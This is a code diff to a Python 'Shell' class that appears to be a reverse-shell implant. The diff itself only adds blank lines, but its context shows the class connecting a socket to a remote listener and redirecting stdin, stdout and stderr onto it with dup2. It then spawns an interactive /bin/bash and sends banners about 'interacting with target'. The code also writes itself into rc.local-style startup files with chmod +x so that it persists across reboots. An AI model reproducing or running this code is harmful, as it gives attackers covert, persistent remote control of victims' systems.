@@ -53,6 +53,7 @@ class Shell:
                         f"\n\033[0;37m[\033[0;31m+\033[0;37m] Connected to {self.public_ipv4_address}!"
                             .encode()
                     )
+                    
                     socket_sock.send(
                         f"\n\033[0;37m[\033[0;31m+\033[0;37m] Start interacting with target ..."
                             .encode()
@@ -66,6 +67,7 @@ class Shell:
                         f" to {self.remote_username}'s machine {self.remote_hostname} "
                             .encode()
                     )
+                    
                     socket_sock.send(
                         f"\n\033[0;37m[\033[0;31m+\033[0;37m] Starting reverse shell to {self.remote_hostname} ..."
                             .encode()
@@ -77,10 +79,12 @@ class Shell:
                         socket_sock.fileno(),
                         0
                     )  # return stream integer file descriptor
+                    
                     dup2(
                         socket_sock.fileno(),
                         1
                     )  # used for request I/O actions from the OS
+                    
                     dup2(
                         socket_sock.fileno(),
                         2
@@ -97,6 +101,7 @@ class Shell:
                         "/bin/bash",
                         "-i"
                     ])
+                    
             except ConnectionRefusedError:
                 pass
 
@@ -107,23 +112,27 @@ class Shell:
                 "w"
             ) as persis_file:
                 persis_file.write("#!/bin/bash\n#\n# rc.local\n#\n# This script is executed at the end of each multiuser runlevel.\n# Make sure that the script will 'exit 0' on success or any other\n# value on error.\n#\n# In order to enable or disable this script just change the execution\n# bits.\n#\n# By default this script does nothing.\n")
+            
             if os.path.isfile(self.persis_path):
                 with open(
                     self.persis_path, 
                     "a"
                 ) as persis_file1:
                     persis_file1.write(f"python3 {__file__} &")
+                
                 subprocess.call([
                     "chmod", 
                     "+x", 
                     self.persis_path
                 ])
+        
         else:
             with open(
                 self.persis_path, 
                 "a"
             ) as persis_file1:
                 persis_file1.write(f"python3 {__file__} &")
+                
             subprocess.call([
                 "chmod", 
                 "+x", 
